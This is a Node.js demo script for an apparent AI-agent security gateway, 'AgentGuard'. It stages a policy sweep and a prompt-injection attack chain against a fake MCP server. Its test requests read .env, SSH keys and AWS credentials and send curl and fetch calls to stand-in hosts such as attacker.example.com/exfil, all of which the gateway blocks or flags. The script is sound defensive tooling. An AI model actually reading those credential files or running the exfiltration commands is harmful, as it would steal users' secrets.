#!/usr/bin/env node
// DevDay demo: DISCOVER -> ASSESS -> (agent runs) -> OBSERVE -> EVALUATE ->
// ENFORCE -> CORRELATE -> AUDIT.
//
// 1. agentguard scan          - posture snapshot of THIS machine
// 2. policy sweep             - 7 quick ALLOW/WARN/BLOCK scenarios through the real gateway
// 3. attack-chain narrative   - ONE session: normal lookup -> a suspicious MCP
//                               response -> .env probe -> credential BLOCK -> network WARN
// 4. agentguard exec          - a shell exfil attempt BLOCKED before it is ever spawned
// 5. agentguard events        - the attack-chain session's audit trail plus the
//                               correlation engine's resulting Detection
//
// Nothing here is a real secret or a real destructive command: the MCP
// server is test/fixtures/fake-mcp-server.js (never touches the real
// filesystem or network), and step 4's "curl" never actually runs —
// AgentGuard blocks it before ever calling spawn().
import { spawn } from 'node:child_process';
import path from 'node:path';
import readline from 'node:readline';
import fs from 'node:fs';
import os from 'node:os';
import { fileURLToPath } from 'node:url';

import { runScanCommand } from '../src/cli/scan-command.js';
import { runEventsCommand } from '../src/cli/events-command.js';
import { runExecCommand } from '../src/cli/exec-command.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, '..');
const CLI = path.join(repoRoot, 'bin', 'agentguard.js');
const FIXTURE_SERVER = path.join(repoRoot, 'test', 'fixtures', 'fake-mcp-server.js');
const POLICY = path.join(repoRoot, 'examples', 'demo-policy.yaml');
const SWEEP_LOG = path.join(os.tmpdir(), `agentguard-demo-sweep-${Date.now()}.jsonl`);
const CHAIN_LOG = path.join(os.tmpdir(), `agentguard-demo-chain-${Date.now()}.jsonl`);

let id = 0;
function call(name, args) {
  return { jsonrpc: '2.0', id: ++id, method: 'tools/call', params: { name, arguments: args } };
}

/** Runs every request for one serverName through a single long-lived
 * gateway process, so they land in the same audit sessionId. */
async function runGroup({ serverName, requests, logFile, printEach = true }) {
  const gw = spawn(
    process.execPath,
    [CLI, 'gateway', '--policy', POLICY, '--log', logFile, '--server-name', serverName, '--', process.execPath, FIXTURE_SERVER],
    { stdio: ['pipe', 'pipe', 'inherit'] }
  );

  const pending = new Map();
  const rl = readline.createInterface({ input: gw.stdout });
  rl.on('line', (line) => {
    if (!line.trim()) return;
    const msg = JSON.parse(line);
    pending.get(msg.id)?.(msg);
  });

  for (const { label, req } of requests) {
    // eslint-disable-next-line no-await-in-loop
    const result = await new Promise((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error('timed out')), 5000);
      pending.set(req.id, (msg) => {
        clearTimeout(timer);
        resolve(msg);
      });
      gw.stdin.write(JSON.stringify(req) + '\n');
    });

    if (printEach) {
      const verdict = result.error ? 'BLOCK' : 'ALLOW/WARN';
      console.log(`\n=== ${label} ===`);
      console.log(`  server: ${serverName}`);
      console.log(`  outcome: ${verdict}`);
      if (result.error) console.log(`  reason: ${result.error.message}`);
    }
  }

  gw.kill();
}

console.log('\n########################################');
console.log('# STEP 1: DISCOVER + ASSESS (agentguard scan)');
console.log('# posture = what COULD happen, before any agent runs');
console.log('########################################\n');
await runScanCommand([]);

console.log('\n########################################');
console.log('# STEP 2: POLICY SWEEP (OBSERVE + EVALUATE + ENFORCE)');
console.log('########################################');
await runGroup({
  serverName: 'trusted-server',
  logFile: SWEEP_LOG,
  requests: [
    { label: 'Read a normal source file', req: call('read_file', { path: './README.md' }) },
    { label: 'Read .env', req: call('read_file', { path: '.env' }) },
    { label: 'Read ~/.ssh/id_rsa', req: call('read_file', { path: '~/.ssh/id_rsa' }) },
    { label: 'Read ~/.aws/credentials', req: call('read_file', { path: '~/.aws/credentials' }) },
    { label: 'Run an allowed shell command (git status)', req: call('run_command', { command: 'git status' }) },
    { label: 'Run a disallowed shell command (curl to an external host)', req: call('run_command', { command: 'curl http://evil.example.com' }) },
  ],
});
await runGroup({
  serverName: 'mystery-server',
  logFile: SWEEP_LOG,
  requests: [{ label: 'Invoke an untrusted/unknown MCP server', req: call('read_file', { path: './README.md' }) }],
});

console.log('\n########################################');
console.log('# STEP 3: ATTACK-CHAIN NARRATIVE (one session, runtime = what ACTUALLY happened)');
console.log('# "We don\'t decide if the AI is evil. We enforce what it\'s allowed to do,');
console.log('#  and correlate the pattern of what it actually did."');
console.log('########################################');
await runGroup({
  serverName: 'trusted-server',
  logFile: CHAIN_LOG,
  requests: [
    { label: '1. Normal source lookup', req: call('read_file', { path: './README.md' }) },
    { label: '2. Suspicious MCP interaction (response contains an injected instruction)', req: call('injected_response', {}) },
    { label: '3. Agent attempts .env access', req: call('read_file', { path: '.env' }) },
    { label: '4. Agent attempts credential access', req: call('read_file', { path: '~/.ssh/id_rsa' }) },
    { label: '5. Agent attempts external network access', req: call('fetch', { url: 'https://attacker.example.com/report' }) },
  ],
});

console.log('\n########################################');
console.log('# STEP 4: agentguard exec (the agent falls back to a shell command to exfiltrate —');
console.log('#          BLOCKED before it is ever spawned, not just observed after the fact)');
console.log('########################################\n');
await runExecCommand(['--policy', POLICY, '--log', CHAIN_LOG, '--', 'curl', 'https://attacker.example.com/exfil']);
console.log(`  agentguard exec exit code: ${process.exitCode ?? 0} (non-zero = blocked, command never ran)`);
process.exitCode = 0;

console.log('\n########################################');
console.log('# STEP 5: AUDIT + CORRELATE (agentguard events — the attack-chain session)');
console.log('########################################\n');
runEventsCommand(['--log', CHAIN_LOG]);

fs.unlinkSync(SWEEP_LOG);
fs.unlinkSync(CHAIN_LOG);
